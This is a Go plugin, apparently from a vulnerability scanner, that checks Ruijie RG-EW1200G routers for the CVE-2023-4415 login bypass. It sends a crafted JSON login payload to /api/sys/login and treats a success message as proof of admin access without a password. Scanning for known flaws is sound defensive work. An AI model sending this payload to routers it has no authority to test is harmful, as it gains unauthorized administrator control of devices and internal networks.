package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"net/http"
	"strings"
)

func init() {
	Register("ruijie_EW1200G_bypass", &ruijie_EW1200G_bypass{})
}

type ruijie_EW1200G_bypass struct{}

func (p *ruijie_EW1200G_bypass) Info() PluginInfo {
	return PluginInfo{
		Name:     "锐捷RG-EW1200G登录绕过",
		VulnInfo: "锐捷网络RG-EW1200G HWR_1.0(1)B1P5,Release(07161417) r483存在登录绕过逻辑漏洞，允许任何用户无需密码即可获得设备管理员权限。登录路由器，获取敏感信息，控制内部网络。",
		VulnID:   "CVE-2023-4415",
		Level:    "8.8 HIGH",
		URL:      "",
		Version:  "",
		CWE:      "CWE-287	认证机制不恰当",
	}
}

func (p *ruijie_EW1200G_bypass) Check(netloc string) bool {
	payload := `{
        "username":"2",
        "password":"admin",
        "timestamp":1695218596000
        }`
	req, err := http.NewRequest("POST", netloc+"/api/sys/login", bytes.NewBufferString(payload))
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "登入成功") {
		return true
	}

	return false
}
